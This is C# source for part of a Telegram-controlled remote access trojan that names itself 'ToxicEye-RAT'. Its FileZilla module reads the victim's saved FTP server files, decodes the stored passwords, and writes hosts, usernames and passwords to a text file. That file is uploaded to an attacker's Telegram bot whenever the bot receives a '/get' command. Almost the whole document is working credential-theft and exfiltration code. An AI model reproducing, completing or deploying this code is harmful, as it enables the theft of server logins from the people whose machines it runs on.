namespace TelegramRAT
{
    internal class FileZilla
    {
        public static void Get()
        {
            // Path info
            string FileZillaPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\";
            string SiteManagerPath = FileZillaPath + "sitemanager.xml";
            string RecentServersPath = FileZillaPath + "recentservers.xml";

            // Database
            string Filename = "filezilla.txt";
            string Output = "[FILEZILLA SERVERS]\n\n";

            // If not installed
            if (!Directory.Exists(FileZillaPath))
            {
                TelegramBotClient.SendTextMessage(new ChatId("chat_id"), "🛠 FileZilla not installed");
                return;
            }

            // Get data from recentserver.xml
            if (File.Exists(RecentServersPath))
            {
                try
                {
                    XmlDocument Doc = new XmlDocument();
                    Doc.Load(RecentServersPath);
                    foreach (XmlNode Node in Doc.GetElementsByTagName("Server"))
                    {
                        // Get values
                        string Url = "ftp://" + Node["Host"].InnerText + ":" + Node["Port"].InnerText + "/";
                        string Username = Node["User"].InnerText;
                        string Password = Encoding.UTF8.GetString(Convert.FromBase64String(Node["Pass"].InnerText));
                        // Add
                        Output += "URL: " + Url + "\n"
                                 + "USERNAME: " + Username + "\n"
                                 + "PASSWORD: " + Password + "\n"
                                 + "\n";
                    }
                }
                catch
                {
                    TelegramBotClient.SendTextMessage(new ChatId("chat_id"), "⛔ Failed to read recentserver.xml");
                }
            }

            // Get data from sitemanager.xml
            if (File.Exists(SiteManagerPath))
            {
                try
                {
                    XmlDocument Doc = new XmlDocument();
                    Doc.Load(SiteManagerPath);
                    foreach (XmlNode Node in Doc.GetElementsByTagName("Server"))
                    {
                        // Get values
                        string Url = "ftp://" + Node["Host"].InnerText + ":" + Node["Port"].InnerText + "/";
                        string Username = Node["User"].InnerText;
                        string Password = Encoding.UTF8.GetString(Convert.FromBase64String(Node["Pass"].InnerText));
                        // Add
                        Output += "URL: " + Url + "\n"
                                 + "USERNAME: " + Username + "\n"
                                 + "PASSWORD: " + Password + "\n"
                                 + "\n";
                    }
                }
                catch
                {
                    TelegramBotClient.SendTextMessage(new ChatId("chat_id"), "⛔ Failed to read sitemanager.xml");
                }
            }

            // Send
            File.WriteAllText(Filename, Output);
            TelegramBotClient.UploadFile(new Telegram.Bot.Types.InputFile("filezilla.txt"), true);
        }
    }

    internal class Program
    {
        static void Main(string[] args)
        {
            // Telegram API settings
            string Token = "YOUR_TELEGRAM_BOT_TOKEN";
            string ChatId = "YOUR_CHAT_ID";

            // Create bot client
            TelegramBotClient Bot = new TelegramBotClient(Token);
            Bot.StartReceiving();

            // Send initial message
            Bot.SendTextMessage(new ChatId(ChatId), "🔫 ToxicEye-RAT is starting...");

            // Add handler for new messages
            Bot.OnMessage += MessageReceived;

            // Start the bot
            Console.ReadLine();
        }

        private static void MessageReceived(object sender, Telegram.Bot.Args.MessageEventArgs e)
        {
            // Handle incoming messages
            string Command = e.Message.Text;
            Console.WriteLine("Message received: " + Command);

            // Execute command
            if (Command == "/get")
            {
                FileZilla.Get();
            }
        }
    }
}
